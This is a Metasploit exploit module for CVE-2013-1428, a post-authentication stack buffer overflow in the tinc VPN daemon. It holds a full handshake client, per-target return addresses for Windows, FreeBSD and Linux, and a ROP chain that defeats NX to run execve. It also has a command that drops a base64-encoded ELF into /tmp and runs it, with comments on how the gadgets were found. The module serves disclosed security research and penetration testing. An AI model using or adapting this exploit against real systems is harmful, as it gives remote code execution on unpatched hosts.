##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
#

require 'msf/core'
require 'securerandom'
require 'openssl'
require 'digest/sha1'
require 'rex/socket'

class TincExploitClient

  #PROGRAM flow:
  #1. SYN, SYN/ACK, ACK - further TCP ACK's are not included
  #2. ID, client PSH: "0 testnode2 17.0"
  #3. ID, server PSH: "0 testnode2 17.0"
  #4. Metakey, client PSH: "1 94 64 0 0 VALUE_1"
  #5. Metakey, server PSH: "1 94 64 0 0 VALUE_2"
  #6. Receive Challenge from server, server PSH: 515 bytes - 3f8a4c...
  #7. Send Challenge to server, client PSH: 520 bytes - cdca80...
  #8. Challenge Reply to server, client PSH: 48 bytes - c2f415...
  #9. Challenge Reply from server, server PSH: 43 bytes - d34d78...
  #10. ACK of client, client PSH: 16 bytes - 7ffca1...
  #11. ACK part1 of server, server PSH: 11 bytes - 93fdcf...
  #12. ACK part2 of server, server PSH: 69 bytes - e6051a...
  #13. attack, client PSH: payload - 9d6a94...

  def initialize(clientConfig, payload, stdout, stderr)
    @state = "id"
    @buffer = ""
    @inbuffer = ""
    @encryption_queue = []
    @decryption_queue = ""
    @socket = nil

    @keepReadingSocket = true

    @client_name = clientConfig['CLIENT_NAME']

    @host = clientConfig['RHOST']
    @tcp_port = clientConfig['RPORT']
    @payload = payload
    @stdout = stdout
    @stderr = stderr

    #IMPORTANT: This class is untested with other lengths
    @bfblocksize =  64/8
    @key_len = 256
    @stdout.call("Assuming challenge (key) length of %d" % [@bfblocksize, @key_len])

    @client_private_key_cipher = nil
    @hex_enc_key_S1 = nil
    @bf_enc_cipher = nil
    self.initCiphers(clientConfig['SERVER_PUBLIC_KEY_FILE'], clientConfig['CLIENT_PRIVATE_KEY_FILE'])
    @stdout.call("Ciphers locally initalized, private key and public key files seem to be ok")
    @bf_dec_cipher = nil
  end

  def exploit()
    begin
      @socket = TCPSocket.open(@host, @tcp_port)
    rescue Errno::ECONNREFUSED => e
      @stderr.call("Can not connect (port closed?). Aborting.")
      return
    end
    begin
      self.id() #send the first message
      while @keepReadingSocket
        data = @socket.recv(1024)
        self.receive_data(data)
      end
      @socket.close
    rescue Errno::ECONNRESET => e
      if @state == "metakey"
        @stderr.call("Server reset the connection. Probably rejecting the private "\
        "key and/or client name (e.g. client name not associated with client public key on server side). "\
        "Wrong server public key possible too. "\
        "Please recheck client name, client private key and server public key.")
      else
        @stderr.call("Server reset the connection, reason unknown.")
      end
    end
  end

  def initCiphers(server_file, client_file)
    server_public_key_cipher = OpenSSL::PKey::RSA.new(File.read(server_file))
    @client_private_key_cipher = OpenSSL::PKey::RSA.new(File.read(client_file))

    encryptionSuccessful = false
    while not encryptionSuccessful
      begin
        key_S1 = SecureRandom.random_bytes(@key_len)
        #can happen here:
        #`public_encrypt': data too large for modulus (OpenSSL::PKey::RSAError)
        enc_key_S1 = server_public_key_cipher.public_encrypt(key_S1, OpenSSL::PKey::RSA::NO_PADDING)
        encryptionSuccessful = true
      rescue OpenSSL::PKey::RSAError => e
        #the while loop will take care
      end
    end

    @hex_enc_key_S1 = enc_key_S1.unpack("H*")[0]

    # setup encryption
    bf_enc_key = key_S1[240...256]
    bf_enc_iv = key_S1[232...240]

    @bf_enc_cipher = OpenSSL::Cipher::Cipher.new("BF-OFB")
    @bf_enc_cipher.encrypt
    @bf_enc_cipher.key = bf_enc_key
    @bf_enc_cipher.iv = bf_enc_iv

    ##Looks like ruby openssl supports other lengths than multiple of 8!
    #test = @bf_enc_cipher.update("A"*10)
    #test << @bf_enc_cipher.final
    #puts "Testing cipher: "+test.unpack("H*")[0]
  end

  def receive_data(data)
    @inbuffer += data
    if @state == "id"
      if(self.has_line())
        data = self.get_line()
        @stdout.call("Received ID from server: [%s]" % (data[0..30]))
        @state = "metakey" #next expected state
        self.metakey()
      end
    end
    if @state == "metakey"
      if self.has_line()
        data = get_line()
        @stdout.call("Received Metakey from server: [%s...]" % (data[0..30]))
        data = data.split(" ")
        raise "Error in protocol. The first byte should be an ASCII 1." unless data[0] == "1"
        hexkey_S2 = data[5].rstrip #("\n")
        raise "Error in protocol. hexkey_S2 length should be %d." % @key_len*2 unless hexkey_S2.length == @key_len*2
        @enckey_S2 = [hexkey_S2].pack("H*")
        key_S2 = @client_private_key_cipher.private_decrypt(@enckey_S2, OpenSSL::PKey::RSA::NO_PADDING)

        # setup decryption
        bf_dec_key = key_S2[240..256]
        bf_dec_iv = key_S2[232..240]

        @bf_dec_cipher = OpenSSL::Cipher::Cipher.new "BF-OFB"
        @bf_dec_cipher.encrypt
        @bf_dec_cipher.key = bf_dec_key
        @bf_dec_cipher.iv = bf_dec_iv
        #OFB mode: don't forget, it does matter if you do a
        #@bf_dec_cipher.reset or not, but DON'T BECAUSE IT BREAKS STUFF :D
        @stdout.call("Crypto handshake/exchange completed")
        @state = "challenge"
        self.challenge()
      end
    end

    if @state == "challenge"
      need_len = 515
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        @stdout.call("Received challenge from server: [%s...]" % data.unpack("H*")[0][0..30])
        data = data.split(" ", 2)
        raise "Error in protocol. The first byte should be an ASCII 2." unless data[0] == "2"
        challenge2 = data[1][0...512]
        challenge2 = [challenge2].pack("H*")
        raise "Error in protocol. challenge2 length should be %d." % @key_len unless challenge2.length == @key_len
        @state = "challenge_reply"
        self.challenge_reply(challenge2)
      end
    end

    if @state == "challenge_reply"
      need_len = 43
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        @stdout.call("Received challenge reply from server: [%s...]" % data.unpack("H*")[0][0..30])
        @state = "ack"
        self.ack()
      end
    end

    if @state == "ack"
      need_len = 12
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        @stdout.call("Received ack (server accepted challenge response): [%s...]" % data.unpack("H*")[0][0..30])
        @state = "done"
        self.overflow()
      end
    end
  end

  def handle_write()
    #handle encryption queue first
    if @encryption_queue.length > 0
      msg = @encryption_queue[0]
      @encryption_queue.delete_at(0)
      @buffer = @bf_enc_cipher.update(msg)
      @buffer << @bf_enc_cipher.final
      #DON'T DO A @bf_enc_cipher.reset
    end

    if @buffer.length > 0
      sent = self.send_data(@buffer)
      @stdout.call("Sent %d bytes: [%s...]" % [sent, @buffer.unpack("H*")[0][0..30]])
      @buffer = @buffer[sent..@buffer.length]
    end
  end

  def send_data(buf)
    @socket.send(buf,0)
    return buf.length
  end

  def pop_inbuffer_and_decrypt(size)
    @decryption_queue = pop_inbuffer(size)
    # In ruby openssl OFM works not only on full blocks, but also on
    # parts. Therefore no worries like in pycrypto and no
    # modified decrypt routine, simply use the cipher as is.
    data = @bf_dec_cipher.update(@decryption_queue)
    data << @bf_dec_cipher.final
    #DON'T DO A bf_dec_cipher.reset
    @decryption_queue = ""
    return data
  end

  def pop_inbuffer(size)
    data = @inbuffer[0...size]
    if size >= @inbuffer.length
      @inbuffer = ""
    else
      @inbuffer = @inbuffer[size+1..@inbuffer.length]
    end
    return data
  end

  def get_line()
    idx = @inbuffer.index("\n")
    data = self.pop_inbuffer(idx)
    return data
  end

  def has_line()
    if @inbuffer.match("\n")
      return true
    else
      return false
    end
  end

  def id()
    msg = "0 %s 17.0\n" % @client_name
    @stdout.call("Sending ID (cleartext): [%s]" % msg.gsub("\n",""))
    @buffer += msg
    self.handle_write()
  end

  def metakey()
    msg = "1 94 64 0 0 %s\n" % (@hex_enc_key_S1)
    @stdout.call("Sending metakey (cleartext): [%s...]" % msg[0..30])
    @buffer += msg
    self.handle_write()
  end

  def challenge()
    @stdout.call("Sending challenge (ciphertext)")
    challenge = SecureRandom.random_bytes(@key_len)
    msg = "2      %s\n" % (challenge.unpack("H*")[0])
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def challenge_reply(challenge2)
    @stdout.call("Sending challenge reply (ciphertext)")
    h = Digest::SHA1.hexdigest(challenge2)
    msg = "3      %s\n" % (h.upcase)
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def ack()
    @stdout.call("Sending ack (signalise server that we accept challenge reply, ciphertext)")
    @encryption_queue.push("4 %d 123 0    \n" % (@tcp_port))
    self.handle_write()
  end

  def overflow()
    @stdout.call("Protocol setup. Going for exploit (ciphertext). Peng!")
    msg = "17 %d\n%s" % [@payload.length, @payload]
    plen = @bfblocksize - (msg.length % @bfblocksize)
    #padding
    msg += "B" * plen
    @encryption_queue.push(msg)
    @stdout.call("Payload is going to be executed")
    @keepReadingSocket = false
    self.handle_write()
  end
end


class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Tincd Post-Authentication Remote TCP Stack Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in Tinc's tincd.exe
        service. After authentication, a specially crafted tcp packet (default port 655)
        leads to a buffer overflow and allows to execute arbitrary code. This module has
        been tested with tinc-1.1pre6 on Windows XP (custom calc payload) and Windows 7
        (windows/meterpreter/reverse_tcp), and tinc version 1.0.19 from the ports of
        FreeBSD 9.1-RELEASE #0. The exploit probably works for versions <= 1.1pre6.
        A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to
        be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd
        was compiled. Bug got fixed in version 1.0.21. Maintainer informed to start
        using DEP/ASLR and other protection mechanisms.
      },
      'Author'         => [ #PoC changes, port python to ruby, exploitation, metasploit module all OS
                            'Tobias Ospelt <tobias at modzero dot ch> @floyd_ch',
                            #original finding, python PoC crash
                            'Martin Schobert <schobert at modzero dot ch>',
        ],
      'References'     =>
        [
          [ 'CVE', '2013-1428' ],
          [ 'OSVDB', '92653' ],
          [ 'BID', '59369' ],
          [ 'URL',
            ['http://www.floyd.ch/?p=741',
            'http://sitsec.net/blog/2013/04/22/stack-based-buffer-overflow-in-the-vpn-software-tinc-for-authenticated-peers/',
            'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-1428'
            ]
          ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 1675,
          'DisableNops' => true,
        },
      'Privileged'     => true,
      'Targets'        =>
          [
            #full exploitation:
            ['Windows XP x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Windows 7 x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['FreeBSD 9.1-RELEASE #0 x86, tinc 1.0.19 (ports)', { 'Platform' => 'bsd', 'Ret' => 0x0804BABB, 'offset' => 1676 }],
            ['Fedora 19 x86 ROP (NX) write binary to disk payloads, tinc 1.0.20 (manual compile)',  {
              'Platform' => 'linux', 'Arch' => ARCH_X86, 'Ret' => 0x4d10ee87, 'offset' => 1676 }
              ],
            ['Fedora 19 x86 ROP (NX) CMD exec payload, tinc 1.0.20 (manual compile)',  {
              'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Ret' => 0x4d10ee87, 'offset' => 1676 }
              ],
            ['Archlinux 2013.04.01 x86, tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x08065929, 'offset' => 1676 }],
            ['OpenSuse 11.2 x86, tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0804b07f, 'offset' => 1676 }],
            #crash only:
            ['Crash only: Ubuntu 12.10 x86, tinc 1.1.pre6 (apt-get or manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Crash only: Fedora 16 x86, tinc 1.0.19 (yum)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Crash only: OpenSuse 11.2 x86, tinc 1.0.16 (rpm package)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
          ],

      'DisclosureDate' => 'Apr 22 2013', #finding, msf module: Dec 2013
      'DefaultTarget'  => 0))

    register_options(
      [ Opt::RPORT(655),
        #As this is a post-auth module, you should know the value of the following variables by simply checking
        #your configuration.
        OptPath.new('SERVER_PUBLIC_KEY_FILE',  [ true, 'Server\'s public key', '' ]),
        OptPath.new('CLIENT_PRIVATE_KEY_FILE', [ true, 'Your client private key', '']),
        #You should see CLIENT_NAME in cleartext in the first message to the server by your usual tinc client (tcpdump or
        #wireshark it: e.g. "0 home 17.0", so it's "home"). On the server, this is located in the config folder, e.g. in FreeBSD
        #there is the client public key file /usr/local/etc/tinc/hosts/home for the client "home"
        #If you don't have a clue, maybe just try the filename of your private key without file extension
        OptString.new('CLIENT_NAME', [true, 'Your client name (pre-shared with server)' , '']),
      ], self
    )
  end


  def exploit

    #WINDOWS XP and 7 full exploitation
    #Simple, we only need some mona.py magic
    #C:\Program Files\tinc>"C:\Program Files\Immunity Inc\Immunity Debugger\ImmunityDebugger.exe" "C:\Program Files\tinc\tincd.exe -D -d 5"
    #!mona config -set workingfolder c:\logs\%p
    #!mona pc 1682
    #  --> C:\logs\tincd\pattern
    #!mona findmsp
    #Straight forward, when we overwrite EIP the second value
    #on the stack is pointing to our payload.
    #!mona findwild -o -type instr -s "pop r32#ret"

    #FREEBSD full exploitation
    #Same offset as windows, same exploitation method
    #But we needed a new pop r32#ret for the freebsd version
    #No mona.py help on bsd or linux so:
    #- Dumped .text part of tincd binary in gdb
    #- Search in hex editor for opcodes for "pop r32#ret":
    #  58c3, 59c3, ..., 5fc3
    #- Found a couple of 5dc3. ret = start of .text + offset in hex editor
    #- 0x0804BABB works very well

    #UBUNTU crash only
    #Manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash, because
    #the bug is in a fixed size (MAXSIZE) struct member variable. The size of the destination is known
    #at compile time. gcc is introducing a call to __memcpy_chk:
    #http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c
    #memcpy_chk does a __chk_fail call if the destination buffer is smaller than the source buffer. Therefore it will print
    #*** buffer overflow detected *** and terminate (SIGABRT). The same result for tincd 10.0.19 which can be installed
    #from the repository. It might be exploitable for versions compiled with an older version of gcc.
    #memcpy_chk seems to be in gcc since 2005:
    #http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c
    #http://gcc.gnu.org/git/?p=gcc.git;a=history;f=libssp/memcpy-chk.c;hb=92920cc62318e5e8b6d02d506eaf66c160796088

    #OPENSUSE
    #OpenSuse 11.2
    #Installation as described on the tincd website. For 11.2 there are two versions.
    #Decided for 1.0.16 as this is a vulnerable version
    #wget "http://download.opensuse.org/repositories/home:/seilerphilipp/SLE_11_SP2/i586/tinc-1.0.16-3.1.i586.rpm"
    #rpm -i tinc-1.0.16-3.1.i586.rpm
    #Again, strace shows us that the buffer overflow was detected (see Ubuntu)
    #writev(2, [{"*** ", 4}, {"buffer overflow detected", 24}, {" ***: ", 6}, {"tincd", 5}, {" terminated\n", 12}], 5) = 51
    #So a crash-only non-exploitable bof here. So let's go for manual install:
    #wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    #yast -i gcc zlib zlib-devel && echo "yast is still ugly" && zypper install lzo-devel libopenssl-devel make && make && make install
    #Exploitable. Let's see:
    #tincd is mapped at 0x8048000. There is a 5d3c at offset 307f in the tincd binary. this means:
    #so the offset to pop ebp; ret is 0x0804b07f

    #FEDORA
    #Fedora 16
    #yum has version 1.0.19
    #yum install tinc
    #Non-exploitable crash, see Ubuntu. Strace tells us:
    #writev(2, [{"*** ", 4}, {"buffer overflow detected", 24}, {" ***: ", 6}, {"tincd", 5}, {" terminated\n", 12}], 5) = 51
    #About yum: Fedora 17 has fixed version 1.0.21, Fedora 19 fixed version 1.0.23
    #Manual compile went on with Fedora 19
    #wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    #yum install gcc zlib-devel.i686 lzo-devel.i686 openssl-devel.i686 && ./configure && make && make install
    # #hardening-check tincd
    # tincd:
    #  Position Independent Executable: no, normal executable!
    #  Stack protected: no, not found!
    #  Fortify Source functions: no, only unprotected functions found!
    #  Read-only relocations: yes
    #  Immediate binding: no, not found!
    #Running this module with target set to Windows:
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x0041caa6 in ?? ()
    #well and that's our windows offset...
    # (gdb) info proc mappings
    # 0x8048000  0x8068000    0x20000        0x0 /usr/local/sbin/tincd
    #After finding a normal 5DC3 (pop ebp#ret) at offset 69c3 of the binary we
    #can try to execute the payload on the stack, but:
    # (gdb) stepi
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x08e8ee08 in ?? ()
    #Digging deeper we find:
    # dmesg | grep protection
    # [    0.000000] NX (Execute Disable) protection: active
    #or:
    # # objdump -x /usr/local/sbin/tincd
    # [...] STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
    #       filesz 0x00000000 memsz 0x00000000 flags rw-
    #or: https://bugzilla.redhat.com/show_bug.cgi?id=996365
    #Time for ROP
    #To start the ROP we need a  POP r32# POP ESP# RET (using the first four bytes of the shellcode
    #as a pointer to instructions). Was lucky after some searching:
    # (gdb) x/10i 0x4d10ee87
    #    0x4d10ee87:  pop    %ebx
    #    0x4d10ee88:  mov    $0xf5d299dd,%eax
    #    0x4d10ee8d:  rcr    %cl,%al
    #    0x4d10ee8f:  pop    %esp
    #    0x4d10ee90:  ret

    #ARCHLINUX
    #archlinux-2013.04.01 pacman has fixed version 1.0.23, so went for manual compile:
    #wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    #pacman -S gcc zlib lzo openssl make && ./configure && make && make install
    #Offset in binary to 58c3: 0x1D929 + tincd is mapped at starting address 0x8048000
    #-->Ret: 0x8065929
    #No NX protection, it simply runs the shellcode :)

    garbage = "\x90"
    shellcode = payload.encoded

    if target.name =~ /Fedora 19/
      print_status("Using ROP to defeat NX on Fedora 19")
      if (target.arch.include? ARCH_CMD)
        #The payloads are a bit tricky on Fedora. As of december 2013
        #some of the generic unix payloads (e.g. reverse shell with awk) don't work
        #(even when executed directly in a terminal on Fedora)
        #use generic/custom and specify PAYLOADSTR without single quotes
        shellcode = createFedoraRop(payload.encoded.split(" ", 3)) #it's usually sh -c *bla*
      else
        exe = generate_payload_exe()
        elf_base64 = Rex::Text::encode_base64(exe)
        filename = rand_text_alpha(1)
        #try plain first
        args = ["/bin/sh", "-c", "cd /tmp;echo #{elf_base64}|base64 -d>#{filename};chmod +x #{filename};./#{filename}"]
        shellcode = createFedoraRop(args)
        if shellcode.length > target['offset']
          #try zipped version
          print_status("Plain version too big (#{shellcode.length}), trying zipped version")
          elf_zipped_base64 = Rex::Text::encode_base64(Rex::Text.gzip(exe))
          args = ["/bin/sh", "-c", "cd /tmp;echo #{elf_zipped_base64}|base64 -d|gunzip>#{filename};chmod +x #{filename};./#{filename}"]
          shellcode = createFedoraRop(args)
          print_status("Achieved version with #{shellcode.length} bytes")
        end
        print_status("You will try to execute %s" % args.join(" "))
      end
    end

    if shellcode.length > target['offset']
      print_error("The resulting shellcode has #{shellcode.length} bytes, we only have #{target['offset']} space.")
      return
    end
    injection = shellcode+garbage*(target['offset']-shellcode.length)+[target.ret].pack('V')

    print_status("Injection starts with %s..." % injection.unpack("H*")[0][0..30])
    print_status("Initializing tinc exploit client")
    tincClient = TincExploitClient.new(
      datastore,
      injection,
      method(:print_status),
      method(:print_error)
    )
    print_status("Telling tinc exploit client to exploit")
    tincClient.exploit()
    print_status("Exploit finished")
    end

  def createFedoraRop(sys_execv_args)
    #Gadgets tincd
    loc_dot_data = 0x80692e0 #a location inside .data
    pop_eax = [0x8065969].pack('V') #pop eax; ret
    pop_ebx = [0x8049d8d].pack('V') #pop ebx; ret
    pop_ecx = [0x804e113].pack('V') #pop ecx; ret
    xor_eax_eax = [0x804cd60].pack('V') # xor eax eax; ret
    #<ATTENTION> This one destroys ebx:
    mov_to_eax_addr = [0x805f2c2].pack('V') + [0x41414141].pack('V') #mov [eax] ecx ; pop ebx ; ret
    #</ATTENTION>

    #Gadgets libcrypto.so.10 libcrypto.so.1.0.1e
    xchg_ecx_eax = [0x4d170d1f].pack('V') #xchg ecx,eax; ret
    xchg_edx_eax = [0x4d25afa3].pack('V') #xchg edx,eax ; ret
    inc_eax = [0x4d119ebc].pack('V') #inc eax ; ret

    #Gadgets libc.so.6 libc-2.17.so
    pop_edx = [0x4b5d7aaa].pack('V') #pop edx; ret
    int_80 = [0x4b6049c5].pack('V') #int 0x80

    #Linux kernel system call 11: sys_execve
    #ROP
    rop = ""

    index = 0
    stored_argument_pointer_offsets = []

    sys_execv_args.each_with_index do |argument, argument_no|
      stored_argument_pointer_offsets << index
      argument.scan(/.{1,4}/).each_with_index do |argument_part, i|
        #Put location to write to in eax
        rop += pop_eax
        #Give location inside .data via stack
        rop += [loc_dot_data + index + i*4].pack('V')
        #Pop 4 bytes of the command into ecx
        rop += pop_ecx
        #Give 4 bytes of command on stack
        if argument_part.length == 4
          rop += argument_part
        else
          rop += argument_part+("B"*(4-argument_part.length))
        end
        #Write the 4 bytes to the writable location
        rop += mov_to_eax_addr
      end
      #We have to end the argument with a zero byte
      index += argument.length
      #We don't have "xor ecx, ecx", but we have it for eax...
      rop += xor_eax_eax
      rop += xchg_ecx_eax
      #Put location to write to in eax
      rop += pop_eax
      #Give location inside .data via stack
      rop += [loc_dot_data + index].pack('V')
      #Write the zeros
      rop += mov_to_eax_addr
      index += 1 #where we can write the next argument
    end

    #Append address of the start of each argument
    stored_argument_pointer_offsets.each do |offset|
      rop += pop_eax
      rop += [loc_dot_data + index].pack('V')
      rop += pop_ecx
      rop += [loc_dot_data + offset].pack('V')
      rop += mov_to_eax_addr
      index += 4
    end
    #end with zero
    rop += xor_eax_eax
    rop += xchg_ecx_eax

    rop += pop_eax
    rop += [loc_dot_data + index].pack('V')
    rop += mov_to_eax_addr

    rop += pop_ebx
    rop += [loc_dot_data].pack('V')

    rop += pop_ecx
    rop += [loc_dot_data + sys_execv_args.join(" ").length + 1].pack('V')

    rop += pop_edx
    rop += [loc_dot_data + index].pack('V')

    #sys call 11 = sys_execve
    rop += pop_eax
    rop += [0x0000000b].pack('V')

    rop += int_80
    return rop
  end
end